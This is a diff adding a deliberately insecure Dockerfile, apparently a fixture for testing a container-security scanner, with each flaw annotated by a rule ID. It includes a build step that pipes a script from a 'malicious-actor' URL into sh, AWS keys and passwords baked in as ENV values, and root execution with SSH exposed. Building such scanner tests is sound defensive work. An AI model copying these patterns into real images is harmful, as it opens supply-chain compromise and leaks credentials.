@@ -1,0 +1,56 @@
+# =============================================================================
+# docker/Dockerfile.insecure – TigerGate CNAPP Test: CWPP / Container Security
+# =============================================================================
+# PURPOSE: Intentionally insecure Dockerfile designed to trigger Hadolint and
+# container security scanner detections.
+#
+# HADOLINT / CONTAINER SECURITY FINDINGS:
+#   DL3007: Using :latest tag — no pinned version (supply chain risk)
+#   DL3008: Unspecified package versions in apt-get install
+#   DL3009: Delete apt-get lists after installing
+#   DL3025: Use JSON notation for CMD
+#   DL4006: Use SHELL to enable pipefail
+#   SEC-001: Running as root (no USER instruction)
+#   SEC-002: Sensitive environment variables in image layers (baked secrets)
+#   SEC-003: COPY . . copies .git and secrets into image
+#   SEC-004: wget | sh (remote script execution during build)
+#   SEC-005: Exposed unnecessary ports
+#   CIS Docker Benchmark: 4.1, 4.2, 4.6, 4.7
+# =============================================================================
+
+# 🔴 VULN: DL3007 - Using :latest tag — non-deterministic, supply chain risk
+FROM node:latest
+
+# 🔴 VULN: SEC-001 - Running as root (no USER instruction added)
+# CIS Docker Benchmark: 4.1 – Ensure a user for the container has been created
+
+WORKDIR /app
+
+# 🔴 VULN: DL3008 - No version pinning for apt packages
+# 🔴 VULN: DL3009 - apt lists not removed after install (bloats layer)
+RUN apt-get update && apt-get install -y curl wget netcat vim less telnet
+
+# 🔴 VULN: SEC-004 - Downloading and executing remote script during build
+# This is a common supply chain attack vector (bootstrap scripts)
+RUN curl -fsSL https://raw.githubusercontent.com/malicious-actor/setup/main/install.sh | sh
+
+# 🔴 VULN: SEC-002 - Baking secrets into image as ENV — visible via `docker inspect`!
+# These are baked into the image layer and accessible to anyone with docker pull access.
+ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ENV DB_PASSWORD=root123
+ENV JWT_SECRET=supersecretjwtkey
+
+# 🔴 VULN: SEC-003 - Copies entire directory including .git, node_modules, and secrets/
+# COPY . . is a common mistake that bundles sensitive files into the image
+COPY . .
+
+RUN npm install
+
+# 🔴 VULN: SEC-005 - Exposes an unnecessary SSH port (22) to the runtime
+EXPOSE 3000
+EXPOSE 22
+
+# 🔴 VULN: DL3025 - CMD should use JSON array notation (shell form enables injection)
+# 🔴 VULN: No HEALTHCHECK defined (CIS 4.6)
+CMD node server.js
